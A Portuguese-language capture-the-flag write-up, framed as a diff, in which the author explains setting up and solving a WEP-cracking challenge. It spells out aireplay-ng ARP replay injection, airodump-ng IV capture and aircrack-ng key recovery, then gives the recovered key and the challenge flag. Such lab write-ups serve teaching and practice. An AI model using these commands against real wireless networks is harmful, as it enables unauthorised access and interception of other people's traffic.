@@ -1,0 +1,43 @@
+A primeira seção do writeup não foi executada pelos competidores, só por mim, ao preparar o desafio. Vou explicar pelo propósito didático, já que o método pode ser interessante para alguns.
+
+Parte 1:
+------------------------------------------------------------------------------------
+
+MAC do AP: 
+C0:4A:00:FB:8E:13
+
+MAC de um dispositivo já conectado à rede:
+10:D3:8A:87:BD:18
+
+interface sem fio em modo monitor: wlp0s20f0u3mon
+
+
+>>> sudo aireplay-ng -3 -b C0:4A:00:FB:8E:13 -h 10:D3:8A:87:BD:18 wlp0s20f0u3mon
+
+	-3: executa ataque de ARP reinjection, -h: MAC de um dispositivo associado -b: bssid da rede
+
+>>> sudo airodump-ng -c 1 --bssid C0:4A:00:FB:8E:13 -w handshakes wlp0s20f0u3mon --ivs
+
+	captura IVs na rede do AP especificado em --bssid e escreve em um arquivo com o prefixo "handshakes"
+
+
+*Espero capturar mais de 15000 IVs, para ter certeza de sucesso na quebra da senha (é bem rápido, uma vez que o ARP reinjection esteja rodando)
+
+
+
+Parte 2 (vocês ficaram com a parte mais fácil):
+-------------------------------------------------------------------------------------
+
+Utilizar o aircrack para descobrir a senha do WEP, através dos IVs capturados no arquivo handshakes-01.ivs
+
+>>> aircrack-ng handshakes-01.ivs 
+
+chave WEP recuperada em hex: 47:52:49:53:31 ("GRIS1" em ASCII)
+
+
+Dicas para decriptar o tráfego usando a senha com o wireshark: https://wiki.wireshark.org/HowToDecrypt802.11
+
+Uma vez decriptado, filtro por tráfego http (tem bem pouco) e fica claro onde está a flag: CAOS{acertomizeravi}
+(poderia ter filtrado por texto abusando do formato da flag também, nessa etapa há várias possibilidades, o importante é decriptar o tráfego
+
+
